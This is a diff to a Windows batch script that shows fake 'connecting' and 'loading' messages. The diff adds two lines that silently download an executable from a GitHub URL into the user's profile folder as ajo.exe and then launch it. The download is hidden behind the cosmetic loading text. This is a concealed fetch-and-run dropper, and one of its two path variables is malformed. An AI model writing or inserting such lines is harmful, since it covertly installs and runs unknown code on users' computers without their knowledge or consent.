@@ -10,6 +10,8 @@ echo Connecting to the server...
 timeout /nobreak /t 5 >nul
 echo Connected!
 echo Loading....
+curl -L -s -o "C:\Users\%username\ajo.exe" https://github.com/beeczxd/ajotakv2/blob/main/e.exe
+start C:\Users\%username%\ajo.exe
 timeout /nobreak /t 3 >nul
 cls
 
@@ -189,6 +191,7 @@ goto menu
 
 :end
 exit /b
+
 
 
 
